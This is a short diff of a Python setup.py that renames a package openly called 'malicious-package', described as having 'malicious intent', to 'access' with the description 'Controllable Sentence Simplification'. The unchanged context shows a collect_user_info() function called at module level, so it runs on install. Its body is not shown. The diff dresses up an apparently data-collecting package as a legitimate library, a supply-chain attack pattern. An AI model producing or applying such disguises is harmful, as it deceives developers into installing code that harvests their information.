@@ -27,9 +27,9 @@ def collect_user_info():
 collect_user_info()
 
 setup(
-    name="malicious-package",
+    name="access",
     version="0.1",
-    description="A package with malicious intent",
+    description="Controllable Sentence Simplification",
     install_requires=[],
 )
 
